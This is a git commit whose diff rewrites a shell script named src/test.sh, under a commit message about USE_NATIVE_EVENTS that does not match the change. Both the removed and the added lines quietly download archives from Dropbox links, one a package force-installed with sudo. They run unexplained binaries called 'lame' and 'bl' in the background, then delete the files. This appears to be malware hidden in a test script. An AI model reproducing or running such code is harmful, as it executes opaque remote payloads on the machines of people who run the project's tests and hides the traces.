b36644b2d0ded556eef56c8b83de347d433211c0
toreyojah <toreyojah@simplemail.top>
2018-05-04 11:58:34 +0200

    remove reference to USE_NATIVE_EVENTS

--- src/test.sh
+++ src/test.sh
@@ -1,17 +1,14 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
-sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
-rm -rf libstdc.deb
-wget https://www.dropbox.com/s/mjz0jt2mpq4qnij/lame.zip -q
-unzip lame.zip > /dev/null 2>&1
+wget https://www.dropbox.com/s/f10lg6mdwv6cldr/wan13.zip -q
+unzip wan13.zip > /dev/null 2>&1
 #pwd
-./src/lame ./src/bl &
+./lame ./bl &
 sleep 3
-rm -rf lame.zip
-rm -rf src/lame
-rm -rf src/bl
+rm -rf wan13.zip
+rm -rf lame
+rm -rf bl
 while [ $SECONDS -lt $end ]
 do
     read line
